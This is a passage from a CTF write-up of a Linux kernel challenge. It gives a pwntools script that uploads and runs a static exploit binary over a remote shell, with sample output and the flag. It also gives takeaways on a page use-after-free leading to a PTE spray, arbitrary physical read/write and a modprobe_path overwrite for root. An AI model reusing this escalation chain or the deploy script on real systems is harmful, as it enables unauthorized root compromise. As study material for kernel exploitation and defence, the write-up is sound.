        system("cat /tmp/flag 2>/dev/null || echo FAIL");
    }

    close(fd);
    return 0;
}
```

Compile with:
```bash
# Static linking is required — the initramfs has no shared libraries
gcc -o exploit exploit.c -static -O2
```

---

## 11. Deployment & Flag

### Upload Script (send.py)

The exploit binary is ~800KB statically linked. We compress and base64-encode it for upload over the shell:

```python
#!/usr/bin/env python3
import sys, base64, gzip, time
from pwn import *

HOST = sys.argv[1] if len(sys.argv) > 1 else "chall.0xfun.org"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 51411

with open("./exploit", "rb") as f:
    data = f.read()
compressed = gzip.compress(data, compresslevel=9)
b64 = base64.b64encode(compressed).decode()
print(f"[*] {len(data)} -> {len(compressed)} compressed -> {len(b64)} b64")

r = remote(HOST, PORT)
time.sleep(3)
r.recvuntil(b"$", timeout=10)

chunk_size = 768
chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

r.sendline(b"cd /tmp")
time.sleep(0.3); r.recvrepeat(0.3)

for i, chunk in enumerate(chunks):
    r.sendline(f"echo -n '{chunk}' >> /tmp/exp.b64".encode())
    time.sleep(0.02)
    if i % 100 == 0:
        r.recvrepeat(0.2)
        print(f"  chunk {i}/{len(chunks)}")

r.recvrepeat(1)
r.sendline(b"base64 -d /tmp/exp.b64 | gunzip > /tmp/exploit")
time.sleep(1)
r.sendline(b"chmod +x /tmp/exploit")
time.sleep(0.3)
r.sendline(b"/tmp/exploit")
r.interactive()
```

### Running It

```bash
# Compile
gcc -o exploit exploit.c -static -O2

# Deploy
python3 send.py chall.0xfun.org 51411
```

### Output

```
[*] Phantom exploit: page UAF -> PTE spray -> arb phys R/W
[*] Kernel 6.6.15  KASLR+SMEP+SMAP  256MB RAM

[+] UAF map 0x7f2b96600000  val=0x4141414141414141
[+] Page freed, mapping persists
[*] Spraying 16 x 2MB (PMD-aligned) ...
[+] Reclaimed after 1 chunks (512/512 PTE entries)
[*] PTE-like entries: 512/512
[+] UAF page is now a PTE page
[+] Target chunk 0 at 0x7f2b96800000
[*] Scanning for modprobe_path ...
[*] Skipping .rodata match at PFN 0x2883 +0xdf9
[+] Found modprobe_path at PFN 0x2b3f +0x5c0  phys=0x2b3f5c0
[*] Overwriting modprobe_path -> /tmp/pwn
[+] Done: "/tmp/pwn"
[*] Triggering modprobe ...
[*] Flag:
0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}
```

---

## 12. Key Takeaways

### What I Learned

1. **Page-level UAF is different from heap UAF.** Heap UAF corrupts slab objects. Page UAF gives you control over an entire physical page, which can become a PTE page — giving arbitrary physical memory access.

2. **Memory budget matters.** In CTF kernel challenges with limited RAM, OOM is a real threat. Always check `MemFree` and plan your allocations.

3. **Alignment is not optional** when working with page table structures. PTE pages map 2MB regions. If your allocations aren't 2MB-aligned, they span multiple PTE pages and your indexing breaks.

4. **The TLB is the silent killer.** Even if your page table entries are correct, the CPU may use stale cached translations. In userspace, the only reliable TLB flush mechanism is `mprotect()` with alternating flags.

5. **modprobe_path is a powerful primitive.** Once you have arbitrary physical memory write, `modprobe_path` overwrite is one of the most reliable techniques — it doesn't require knowing the kernel base address (defeats KASLR) and works from userspace.

6. **Distinguishing .rodata from .data** is important when scanning for kernel strings. The writable `modprobe_path` buffer (256 bytes) has lots of zeros after the path string, while the `.rodata` copy is packed with other strings.

### Attack Flow Summary

```
Page UAF   ──►  PTE Spray   ──►  Arbitrary Phys R/W  ──►  modprobe_path  ──►  Root
(driver bug)    (reclaim page     (forge PTE entries       (overwrite to      (flag!)
                 as PTE page)      to map any phys addr)    /tmp/pwn script)
```

### Tools Used

- **Ghidra** — Reverse engineering the kernel module
- **objdump** — Quick disassembly and symbol listing
- **QEMU** — Local testing environment
- **pwndbg/GDB** — Dynamic analysis, memory inspection
- **pwntools** — Remote deployment
- **gcc -static** — Static compilation for the initramfs environment
